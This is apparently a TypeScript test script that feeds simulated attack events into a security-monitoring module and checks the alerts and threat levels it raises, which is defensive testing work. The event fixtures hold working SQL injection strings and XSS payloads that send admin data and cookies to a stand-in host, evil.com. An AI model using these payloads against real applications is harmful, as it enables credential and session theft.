import { securityMonitor, SecurityEventType, SecuritySeverity } from "../lib/security-monitor"

interface IncidentTestCase {
  name: string
  description: string
  events: Array<{
    type: SecurityEventType
    severity: SecuritySeverity
    source: string
    ip?: string
    userAgent?: string
    details?: Record<string, any>
  }>
  expectedAlerts: number
  expectedThreatLevel: "low" | "medium" | "high" | "critical"
}

class SpecificIncidentTester {
  private testCases: IncidentTestCase[] = [
    {
      name: "Advanced SQL Injection Campaign",
      description: "Sophisticated SQL injection attack with multiple vectors",
      events: [
        {
          type: SecurityEventType.SQL_INJECTION_ATTEMPT,
          severity: SecuritySeverity.CRITICAL,
          source: "/api/users/search",
          ip: "203.0.113.45",
          userAgent: "sqlmap/1.6.12",
          details: {
            payload: "' UNION SELECT username,password FROM users WHERE '1'='1",
            method: "POST",
            parameters: ["search", "filter"],
            detected_technique: "Union-based",
          },
        },
        {
          type: SecurityEventType.SQL_INJECTION_ATTEMPT,
          severity: SecuritySeverity.CRITICAL,
          source: "/api/auth/login",
          ip: "203.0.113.45",
          userAgent: "sqlmap/1.6.12",
          details: {
            payload: "admin'; WAITFOR DELAY '00:00:05'--",
            method: "POST",
            parameters: ["username"],
            detected_technique: "Time-based blind",
          },
        },
        {
          type: SecurityEventType.SQL_INJECTION_ATTEMPT,
          severity: SecuritySeverity.CRITICAL,
          source: "/api/products",
          ip: "203.0.113.45",
          userAgent: "sqlmap/1.6.12",
          details: {
            payload: "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            method: "GET",
            parameters: ["id"],
            detected_technique: "Boolean-based blind",
          },
        },
      ],
      expectedAlerts: 3,
      expectedThreatLevel: "critical",
    },
    {
      name: "Cross-Site Scripting (XSS) Attack Variants",
      description: "Multiple XSS attack vectors targeting different input fields",
      events: [
        {
          type: SecurityEventType.XSS_ATTEMPT,
          severity: SecuritySeverity.CRITICAL,
          source: "/api/comments",
          ip: "192.168.1.100",
          userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          details: {
            payload:
              "<script>fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('http://evil.com',{method:'POST',body:JSON.stringify(d)}))</script>",
            field: "comment_text",
            xss_type: "Stored XSS",
            impact: "Data exfiltration",
          },
        },
        {
          type: SecurityEventType.XSS_ATTEMPT,
          severity: SecuritySeverity.HIGH,
          source: "/search",
          ip: "192.168.1.100",
          userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          details: {
            payload: "<img src=x onerror=document.location='http://evil.com/steal?cookie='+document.cookie>",
            field: "search_query",
            xss_type: "Reflected XSS",
            impact: "Session hijacking",
          },
        },
        {
          type: SecurityEventType.XSS_ATTEMPT,
          severity: SecuritySeverity.HIGH,
          source: "/profile/edit",
          ip: "192.168.1.100",
          userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          details: {
            payload: "<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
            field: "bio",
            xss_type: "Stored XSS",
            impact: "Code execution",
            encoding: "Base64",
          },
        },
      ],
      expectedAlerts: 3,
      expectedThreatLevel: "critical",
    },
    {
      name: "Distributed Brute Force Attack",
      description: "Coordinated brute force attack from multiple IP addresses",
      events: [
        {
          type: SecurityEventType.BRUTE_FORCE_ATTACK,
          severity: SecuritySeverity.CRITICAL,
          source: "/api/auth/login",
          ip: "10.0.0.1",
          userAgent: "Python/3.9 requests/2.25.1",
          details: {
            target_account: "admin",
            attempts: 50,
            time_window: "5 minutes",
            attack_pattern: "Dictionary attack",
            passwords_tried: ["admin", "password", "123456", "admin123"],
          },
        },
        {
          type: SecurityEventType.BRUTE_FORCE_ATTACK,
          severity: SecuritySeverity.CRITICAL,
          source: "/api/auth/login",
          ip: "10.0.0.2",
          userAgent: "curl/7.68.0",
          details: {
            target_account: "admin",
            attempts: 45,
            time_window: "5 minutes",
            attack_pattern: "Dictionary attack",
            passwords_tried: ["password123", "admin2023", "qwerty", "letmein"],
          },
        },
        {
          type: SecurityEventType.BRUTE_FORCE_ATTACK,
          severity: SecuritySeverity.CRITICAL,
          source: "/api/auth/login",
          ip: "10.0.0.3",
          userAgent: "Hydra/9.2",
          details: {
            target_account: "admin",
            attempts: 60,
            time_window: "5 minutes",
            attack_pattern: "Brute force",
            attack_tool: "THC Hydra",
          },
        },
      ],
      expectedAlerts: 3,
      expectedThreatLevel: "critical",
    },
    {
      name: "API Abuse and Rate Limiting Bypass",
      description: "Sophisticated API abuse attempting to bypass rate limits",
      events: [
        {
          type: SecurityEventType.API_ABUSE,
          severity: SecuritySeverity.HIGH,
          source: "/api/crypto/prices",
          ip: "172.16.0.10",
          userAgent: "DataScraper/2.1",
          details: {
            requests_per_minute: 500,
            bypass_technique: "IP rotation",
            data_volume: "50MB",
            endpoints_targeted: ["/api/crypto/prices", "/api/crypto/trends", "/api/news"],
          },
        },
        {
          type: SecurityEventType.RATE_LIMIT_EXCEEDED,
          severity: SecuritySeverity.MEDIUM,
          source: "/api/crypto/prices",
          ip: "172.16.0.11",
          userAgent: "DataScraper/2.1",
          details: {
            requests_attempted: 1000,
            rate_limit: 100,
            time_window: "1 hour",
            bypass_attempt: true,
          },
        },
        {
          type: SecurityEventType.API_ABUSE,
          severity: SecuritySeverity.HIGH,
          source: "/api/bots",
          ip: "172.16.0.12",
          userAgent: "AutoTrader/1.0",
          details: {
            requests_per_minute: 300,
            suspicious_patterns: ["Rapid bot creation", "Mass configuration changes"],
            potential_impact: "Resource exhaustion",
          },
        },
      ],
      expectedAlerts: 2,
      expectedThreatLevel: "high",
    },
    {
      name: "Insider Threat Simulation",
      description: "Suspicious activities from authenticated users",
      events: [
        {
          type: SecurityEventType.UNAUTHORIZED_ACCESS,
          severity: SecuritySeverity.HIGH,
          source: "/admin/users",
          ip: "192.168.10.50",
          userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
          details: {
            user_id: "user_12345",
            user_role: "regular_user",
            attempted_resource: "admin_panel",
            access_method: "Direct URL manipulation",
            time: "Outside business hours",
          },
        },
        {
          type: SecurityEventType.SUSPICIOUS_LOGIN,
          severity: SecuritySeverity.MEDIUM,
          source: "/api/auth/login",
          ip: "203.0.113.200",
          userAgent: "Mozilla/5.0 (X11; Linux x86_64)",
          details: {
            user_id: "user_12345",
            login_location: "Unknown country",
            device_fingerprint: "New device",
            login_time: "3:00 AM local time",
            previous_login: "Different continent",
          },
        },
        {
          type: SecurityEventType.API_ABUSE,
          severity: SecuritySeverity.MEDIUM,
          source: "/api/user/data-export",
          ip: "192.168.10.50",
          userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
          details: {
            user_id: "user_12345",
            data_requested: "All user data",
            export_size: "500MB",
            frequency: "Multiple requests in short time",
            suspicious_behavior: "Mass data download",
          },
        },
      ],
      expectedAlerts: 1,
      expectedThreatLevel: "high",
    },
    {
      name: "Advanced Persistent Threat (APT) Simulation",
      description: "Long-term, sophisticated attack campaign",
      events: [
        {
          type: SecurityEventType.SUSPICIOUS_USER_AGENT,
          severity: SecuritySeverity.LOW,
          source: "/api/health",
          ip: "198.51.100.10",
          userAgent: "Mozilla/5.0 (compatible; Reconnaissance/1.0)",
          details: {
            reconnaissance_phase: true,
            endpoints_probed: ["/api/health", "/api/version", "/.well-known/security.txt"],
            information_gathered: "System information",
          },
        },
        {
          type: SecurityEventType.UNAUTHORIZED_ACCESS,
          severity: SecuritySeverity.MEDIUM,
          source: "/api/admin/config",
          ip: "198.51.100.10",
          userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
          details: {
            escalation_attempt: true,
            target_resource: "Configuration files",
            access_method: "Credential stuffing",
            persistence_indicators: ["Multiple login attempts", "Session manipulation"],
          },
        },
        {
          type: SecurityEventType.MALICIOUS_PAYLOAD,
          severity: SecuritySeverity.HIGH,
          source: "/api/upload",
          ip: "198.51.100.10",
          userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
          details: {
            payload_type: "Webshell",
            file_name: "config.php",
            malware_family: "Generic webshell",
            capabilities: ["Remote code execution", "File system access"],
            persistence_mechanism: "File upload",
          },
        },
      ],
      expectedAlerts: 1,
      expectedThreatLevel: "high",
    },
  ]

  async runSpecificIncidentTests(): Promise<void> {
    console.log("🧪 Starting Specific Security Incident Tests")
    console.log("=".repeat(60))

    let totalTests = 0
    let passedTests = 0

    for (const testCase of this.testCases) {
      console.log(`\n🔍 Testing: ${testCase.name}`)
      console.log(`📝 Description: ${testCase.description}`)
      console.log("-".repeat(50))

      try {
        // Clear previous events for clean test
        await securityMonitor.cleanup(0)

        // Log all events for this test case
        for (const eventData of testCase.events) {
          await securityMonitor.logSecurityEvent(eventData)
          // Small delay to simulate real-world timing
          await this.sleep(50)
        }

        // Wait a moment for alert processing
        await this.sleep(100)

        // Verify results
        const stats = securityMonitor.getSecurityStats()
        const alertCount = stats.activeAlerts.length

        console.log(`📊 Results:`)
        console.log(`  Events logged: ${testCase.events.length}`)
        console.log(`  Alerts triggered: ${alertCount} (expected: ${testCase.expectedAlerts})`)
        console.log(`  Threat level: ${stats.threatLevel} (expected: ${testCase.expectedThreatLevel})`)

        // Check if test passed
        const alertsMatch = alertCount >= testCase.expectedAlerts
        const threatLevelMatch = this.compareThreatLevels(stats.threatLevel, testCase.expectedThreatLevel)

        if (alertsMatch && threatLevelMatch) {
          console.log(`✅ Test PASSED`)
          passedTests++
        } else {
          console.log(`❌ Test FAILED`)
          if (!alertsMatch) {
            console.log(`   - Alert count mismatch: got ${alertCount}, expected ${testCase.expectedAlerts}`)
          }
          if (!threatLevelMatch) {
            console.log(
              `   - Threat level mismatch: got ${stats.threatLevel}, expected ${testCase.expectedThreatLevel}`,
            )
          }
        }

        totalTests++

        // Show detailed event information
        console.log(`\n📋 Event Details:`)
        for (const event of stats.recentEvents.slice(0, testCase.events.length)) {
          console.log(`  - ${event.type} (${event.severity}) from ${event.ip || "unknown"}`)
          if (event.details && Object.keys(event.details).length > 0) {
            console.log(`    Details: ${JSON.stringify(event.details, null, 2).substring(0, 100)}...`)
          }
        }

        // Show alert information
        if (stats.activeAlerts.length > 0) {
          console.log(`\n🚨 Active Alerts:`)
          for (const alert of stats.activeAlerts) {
            console.log(`  - ${alert.type} (${alert.severity}): ${alert.message}`)
          }
        }
      } catch (error) {
        console.log(`❌ Test FAILED with error: ${error}`)
        totalTests++
      }
    }

    // Final summary
    console.log("\n" + "=".repeat(60))
    console.log("📊 SPECIFIC INCIDENT TEST SUMMARY")
    console.log("=".repeat(60))
    console.log(`Total Tests: ${totalTests}`)
    console.log(`Passed: ${passedTests}`)
    console.log(`Failed: ${totalTests - passedTests}`)
    console.log(`Success Rate: ${((passedTests / totalTests) * 100).toFixed(1)}%`)

    if (passedTests === totalTests) {
      console.log("🎉 All specific incident tests PASSED!")
    } else {
      console.log("⚠️ Some tests failed. Review the results above.")
    }

    // Show final system state
    const finalStats = securityMonitor.getSecurityStats()
    console.log(`\n🛡️ Final System State:`)
    console.log(`  Total Events: ${finalStats.totalEvents}`)
    console.log(`  Active Alerts: ${finalStats.activeAlerts.length}`)
    console.log(`  Threat Level: ${finalStats.threatLevel}`)
  }

  private compareThreatLevels(actual: string, expected: string): boolean {
    const levels = { low: 1, medium: 2, high: 3, critical: 4 }
    return levels[actual as keyof typeof levels] >= levels[expected as keyof typeof levels]
  }

  private async sleep(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms))
  }

  async runSingleIncidentTest(testName: string): Promise<void> {
    const testCase = this.testCases.find((tc) => tc.name.toLowerCase().includes(testName.toLowerCase()))

    if (!testCase) {
      console.log(`❌ Test case "${testName}" not found`)
      console.log("Available test cases:")
      this.testCases.forEach((tc) => console.log(`  - ${tc.name}`))
      return
    }

    console.log(`🧪 Running Single Test: ${testCase.name}`)
    console.log("=".repeat(50))

    // Clear previous events
    await securityMonitor.cleanup(0)

    // Run the specific test
    for (const eventData of testCase.events) {
      await securityMonitor.logSecurityEvent(eventData)
      await this.sleep(50)
    }

    await this.sleep(100)

    const stats = securityMonitor.getSecurityStats()
    console.log(`\n📊 Test Results:`)
    console.log(`  Events: ${testCase.events.length}`)
    console.log(`  Alerts: ${stats.activeAlerts.length}`)
    console.log(`  Threat Level: ${stats.threatLevel}`)
    console.log(`  Status: ${stats.activeAlerts.length >= testCase.expectedAlerts ? "✅ PASSED" : "❌ FAILED"}`)
  }

  getAvailableTests(): string[] {
    return this.testCases.map((tc) => tc.name)
  }
}

// CLI interface
async function main() {
  const args = process.argv.slice(2)
  const command = args[0] || "run"
  const testName = args[1]

  const tester = new SpecificIncidentTester()

  switch (command) {
    case "run":
    case "all":
      await tester.runSpecificIncidentTests()
      break

    case "single":
    case "test":
      if (testName) {
        await tester.runSingleIncidentTest(testName)
      } else {
        console.log("Please specify a test name:")
        console.log("Available tests:")
        tester.getAvailableTests().forEach((name) => console.log(`  - ${name}`))
      }
      break

    case "list":
      console.log("Available specific incident tests:")
      tester.getAvailableTests().forEach((name) => console.log(`  - ${name}`))
      break

    default:
      console.log("Usage:")
      console.log("  npm run test-incidents")
      console.log("  npm run test-incidents single 'SQL Injection'")
      console.log("  npm run test-incidents list")
      break
  }
}

// Run if called directly
if (require.main === module) {
  main().catch(console.error)
}

export { SpecificIncidentTester }
